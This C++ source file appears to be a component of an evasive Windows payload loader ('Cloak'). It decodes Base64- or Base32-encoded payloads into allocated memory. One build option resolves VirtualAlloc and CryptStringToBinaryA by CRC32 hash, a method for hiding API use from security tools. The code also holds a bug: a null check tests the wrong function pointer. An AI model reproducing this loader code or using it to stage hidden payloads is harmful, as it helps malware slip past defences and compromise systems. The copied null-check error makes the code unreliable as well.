#include "Cloak.hpp"

#ifdef BASE64

#include <wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

#ifdef HASH_API
#include "Hash.hpp"
#include "Defs.hpp"

PBYTE DecodeBase64(IN LPCSTR Payload) {
    HMODULE hCrypt32    = NULL;
    HMODULE hKernel32   = NULL;

    if ( ( hKernel32 = ( HMODULE ) LdrLoadDll( L"KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return NULL;
    }

    if ( ( hCrypt32 = ( HMODULE ) LdrLoadDll( L"CRYPT32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return NULL;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return NULL;
    }

    fnCryptStringToBinaryA pCryptStringToBinaryA = ( fnCryptStringToBinaryA ) GetProcAddressH( hCrypt32, CryptStringToBinaryA_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CryptStringToBinaryA\n" );
        #endif // !DEBUG
        
        return NULL;
    }

    // ---

    DWORD finalSize = 0;
    PBYTE pbPayload = NULL;

    // calculate size
    if ( ! pCryptStringToBinaryA( Payload, 0, CRYPT_STRING_BASE64, NULL, &finalSize, NULL, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] CryptStringToBinaryA 1 Failed with Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return NULL;
    }

    // allocate memory
    pbPayload = ( PBYTE ) pVirtualAlloc( 0, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pbPayload == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return NULL;
    }

    // decode
    if ( ! pCryptStringToBinaryA( Payload, 0, CRYPT_STRING_BASE64, pbPayload, &finalSize, NULL, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] CryptStringToBinaryA 2 Failed with Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return NULL;
    }

    return pbPayload;
}

#else

PBYTE DecodeBase64(IN LPCSTR Payload) {
    DWORD finalSize = 0;
    PBYTE pbPayload = NULL;

    // calculate size
    if ( ! CryptStringToBinaryA( Payload, 0, CRYPT_STRING_BASE64, NULL, &finalSize, NULL, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] CryptStringToBinaryA 1 Failed with Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return NULL;
    }

    // allocate memory
    pbPayload = ( PBYTE ) VirtualAlloc( 0, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pbPayload == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return NULL;
    }

    // decode
    if ( ! CryptStringToBinaryA( Payload, 0, CRYPT_STRING_BASE64, pbPayload, &finalSize, NULL, NULL ) ) {
        #ifdef DEBUG
        printf( "[-] CryptStringToBinaryA 2 Failed with Error -> %d\n", GetLastError());
        #endif // !DEBUG
        
        return NULL;
    }

    return pbPayload;
}

#endif // !HASH_API

#endif // !BASE64

#ifdef BASE32


#define BASE32_PAD '='

const char base32Alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

int base32DecodeChar(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= '2' && c <= '7') return c - '2' + 26;
    return -1; // Invalid character
}

size_t base32Decode(const char* encoded, unsigned char** decoded) {
    size_t inputLen = strlen(encoded);
    size_t outputLen = (inputLen * 5) / 8; // Base32 encodes 5 bytes into 8 characters
    size_t i, j;
    int buffer = 0, bitsLeft = 0;

    // Allocate memory for the decoded data
    *decoded = (unsigned char*)malloc(outputLen);
    if (*decoded == NULL) {
        return 0; // Memory allocation failed
    }

    unsigned char* output = *decoded;
    for (i = 0, j = 0; i < inputLen; i++) {
        char c = toupper(encoded[i]);

        if (c == BASE32_PAD) {
            break; // Padding character found, stop processing
        }

        int value = base32DecodeChar(c);
        if (value == -1) {
            free(*decoded); // Invalid character, free memory
            *decoded = NULL;
            return 0;
        }

        buffer = (buffer << 5) | value;
        bitsLeft += 5;

        if (bitsLeft >= 8) {
            bitsLeft -= 8;
            output[j++] = (unsigned char)((buffer >> bitsLeft) & 0xFF);
        }
    }

    return j; // Return the length of the decoded data
}

#endif // !BASE32